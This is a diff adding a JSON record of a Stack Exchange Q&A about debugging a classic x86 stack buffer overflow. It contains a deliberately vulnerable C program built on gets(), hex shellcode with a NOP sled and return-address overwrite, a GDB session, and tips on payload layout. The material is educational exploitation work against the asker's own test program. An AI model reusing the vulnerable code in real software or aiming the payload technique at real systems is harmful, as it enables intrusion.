@@ -1,0 +1,52 @@
+{
+    "title": "Illegal Instruction exploiting sample Buffer Overflow code",
+    "link": "https://reverseengineering.stackexchange.com/questions/2995/illegal-instruction-exploiting-sample-buffer-overflow-code",
+    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  Some days ago I coded a simple code to test a buffer overflow exploitation on x86 system. In order to keep it simple I disabled ASLR and NX so there are no protection that could cause weird behaviours.\n </p>\n <p>\n  This is my C code to exploit:\n </p>\n <pre><code>#include <stdio.h>\n\nvoid read_txt(){\n        char txt[64];\n        printf(\"Write something:\");\n        gets(txt);\n}\n\n\nint main(){\n    read_txt();\n    return 0;\n}\n</code></pre>\n <p>\n  I also wrote my own shellcode that just prints a string. As far as I know the payload should be something like this, fill the buffer with NOP instructions + shellcode, add 0x41414141 (AAAA) to overwrite EBP register and finally I override the return address with an address pointing to the middle of the NOPs.\n </p>\n <p>\n  Actually it does not work in that way and my payload is as follows:\n </p>\n <pre><code>[1-\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x04\\xb3\\x01\\x68\\x20\\x3b\\x29\\x20\\x68\\x68\\x73\\x65\\x63\\x68\\x20\\x48\\x69\\x67\\x68\\x48\\x6f\\x6c\\x61\\x89\\xe1\\xb2\\x0f\\xcd\\x80\\xb0\\x01\\x31\\xdb][2-\\x41\\x41\\x41\\x41][3-\\x89\\xf4\\xff\\xbf][4-\\x89\\xf4\\xff\\xbf]\n\n1- NOPs + Shellcode = 60bytes\n2- AAAA =4 bytes (Padding to fill the buffer, if NOP+Shellcode fills 64bytes it does not work)\n3- Address to override EBP (In the middle of NOPs)\n4- Overrides Return Address\n</code></pre>\n <p>\n  This exploit works on gdb but fails if I pass the payload directly to the program, and I think that the problem is that just before the program executes gets() function the disasembler shows the\n  <strong>\n   leave\n  </strong>\n  instruction which points esp to ebp and causes an error.\n </p>\n <p>\n  This is the disassembly of read_txt() function:\n </p>\n <pre><code>0x0804844c <+0>:    push   %ebp\n   0x0804844d <+1>: mov    %esp,%ebp\n   0x0804844f <+3>: sub    $0x44,%esp\n   0x08048452 <+6>: movl   $0x8048510,(%esp)\n   0x08048459 <+13>:    call   0x8048320 <printf@plt>\n   0x0804845e <+18>:    lea    -0x40(%ebp),%eax\n   0x08048461 <+21>:    mov    %eax,(%esp)\n   0x08048464 <+24>:    call   0x8048330 <gets@plt>\n   0x08048469 <+29>:    leave  \n   0x0804846a <+30>:    ret    \n</code></pre>\n <p>\n  And this is the execution of the exploit on GDB:\n </p>\n <pre><code>(gdb) x/20x $esp\n0xbffff47c: 0xbffff480  0x90909090  0x90909090  0x90909090\n0xbffff48c: 0x90909090  0xc0319090  0xc931db31  0x04b0d231\n0xbffff49c: 0x206801b3  0x6820293b  0x63657368  0x69482068\n0xbffff4ac: 0x6f486867  0xe189616c  0x80cd0fb2  0xdb3101b0\n0xbffff4bc: 0x41414141  0xbffff489  0xbffff489  0xbffff500\n(gdb) s\nWarning:\nCannot insert breakpoint 0.\nError accessing memory address 0x90909090: I/O Error.\n\n0xbffff489 in ?? ()\n(gdb) c\nContinuing.\nShellcode Executed\nProgram received signal SIGSEGV, Segmentation fault.\n0xbffff4b9 in ?? ()\n(gdb) \n</code></pre>\n <p>\n  Notice that EBP points to 0x90909090 because it has the same address that overrides the return address, and also notice the string\n  <strong>\n   Shellcode Executed\n  </strong>\n  that is the shellcode included in the payload.\n </p>\n <p>\n  My question is, where could I point EBP to avoid this problem before pointing the return address to the NOP slide? Also as secondary question why I can't fill the 64bytes buffer with NOPs+Shellcode?\n </p>\n <p>\n  Regards.\n </p>\n</div>\n</body></html>",
+    "votes": "8",
+    "answers": 1,
+    "views": "17k",
+    "tags": [
+        "c",
+        "exploit",
+        "buffer-overflow"
+    ],
+    "user": "Nucklear",
+    "time": "Nov 1, 2013 at 19:26",
+    "comments": [],
+    "answers_data": [
+        {
+            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  In fact, the memory layout within\n  <code>\n   gdb\n  </code>\n  and outside of it differs of a few bytes. There have been recently a question about this here. You can read:\n  <a href=\"https://reverseengineering.stackexchange.com/questions/2983/how-to-predict-address-space-layout-differences-between-real-and-gdb-controlled\">\n   How to predict address space layout differences between real and gdb-controlled executions?\n  </a>\n </p>\n <p>\n  In your case, you may just have to adjust your address by adding/subtracting 96 bytes.\n </p>\n <p>\n  I can, also, give you a few tricks with\n  <code>\n   gdb\n  </code>\n  to help you a bit with this:\n </p>\n <ul>\n  <li>\n   <p>\n    <code>\n     info frame\n    </code>\n    : This command gives you a full image of the frame you are in. Including where are stored the\n    <em>\n     saved eip\n    </em>\n    ans the\n    <em>\n     saved ebp\n    </em>\n    . It is extremely useful to observe if you reach the right spot in the memory to modify. You may set a breakpoint on\n    <code>\n     read_txt\n    </code>\n    and display the content of the\n    <em>\n     saved eip\n    </em>\n    before and after the\n    <code>\n     gets()\n    </code>\n    is called in order to see if the modification occurred properly.\n   </p>\n  </li>\n  <li>\n   <p>\n    When hitting a:\n   </p>\n   <pre><code>0xbffff489 in ?? ()\n</code></pre>\n   <p>\n    It basically means that\n    <code>\n     gdb\n    </code>\n    did not find any symbol linked to the memory location. But, it might be assembly code, especially if it is your shellcode. So, to disassemble it you can use either of these commands:\n   </p>\n   <ul>\n    <li>\n     <code>\n      disas 0xbffff489,+40\n     </code>\n    </li>\n    <li>\n     <code>\n      x /10i 0xbffff489\n     </code>\n    </li>\n   </ul>\n  </li>\n </ul>\n <p>\n  Hope this help.\n </p>\n</div>\n</body></html>",
+            "votes": "6",
+            "user": "Community",
+            "time": "Apr 13, 2017 at 12:49",
+            "is_accepted": true,
+            "comments": [
+                {
+                    "user": "Nucklear",
+                    "text": "<span class=\"comment-copy\">That's it, the problem was that I was actually pointing outside the nop+shellcode. Also unless it worked inside gdb the stack was different during an external execution and it does not work. Checking the link you provided I understood what was happening and solved the issue. Thanks</span>",
+                    "time": null
+                },
+                {
+                    "user": "KeyC0de",
+                    "text": "<span class=\"comment-copy\">Where do the 96 bytes came from?</span>",
+                    "time": null
+                },
+                {
+                    "user": "perror",
+                    "text": "<span class=\"comment-copy\">@RestlessC0bra: This is the average amount of bytes added by the GCC environment variables when it runs a process (at least this is my experience, it may vary from one system to another).</span>",
+                    "time": null
+                },
+                {
+                    "user": "KeyC0de",
+                    "text": "<span class=\"comment-copy\">@perror Your answer proved very helpful to me. I've learned more gdb tricks and gained better understanding. However this hasn't helped me solve my issue. I'm having segmentation fault at address <code>0x90909090</code>. This is my exact error message\" <code>Program received signal SIGSEGV, Segmentation fault. 0x90909090 in ?? ()</code> I have thoroughly checked and rechecked and now even more with your answer (the command info frame) and i am certain that i overwrite the return address with the address somewhere inside my shellcode. However i can't escape this error <b>!!!</b> Ubuntu 32bit 16.04 LTS</span>",
+                    "time": null
+                },
+                {
+                    "user": "perror",
+                    "text": "<span class=\"comment-copy\">This arrangement might be because the saved <code>ebp</code> address is (partially) checked. It seems to be so in a few systems. So, I took the habit to have this kind of arrangement: [nopsled]+[shellcode]+[return address]+[return address] (the first return address is a fake <code>ebp</code> that ensures that the restored <code>ebp</code> is pointing to an existing memory page pointing onto the stack, and the second return address is the rewrite of the saved <code>eip</code> as needed).</span>",
+                    "time": null
+                }
+            ]
+        }
+    ]
+}
